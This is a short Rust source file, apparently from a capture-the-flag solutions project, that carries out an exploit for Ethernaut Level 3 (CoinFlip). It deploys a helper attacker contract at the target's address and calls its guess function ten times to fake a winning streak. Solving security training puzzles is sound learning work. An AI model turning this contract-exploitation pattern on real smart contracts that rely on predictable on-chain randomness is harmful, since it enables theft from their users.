use crate::abi::hack_coin_flip::HackCoinFlip;
use async_trait::async_trait;
use ctf::ethernaut::lvl03_coin_flip::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 3: CoinFlip
     *
     * This is a coin flipping game where you need to
     * build up your winning streak by guessing the
     * outcome of a coin flip. To complete this target
     * you'll need to use your psychic abilities to
     * guess the correct outcome 10 times in a row.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let coin_contract =
            HackCoinFlip::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        coin_contract.guess().send().await?;
        Ok(())
    }
}
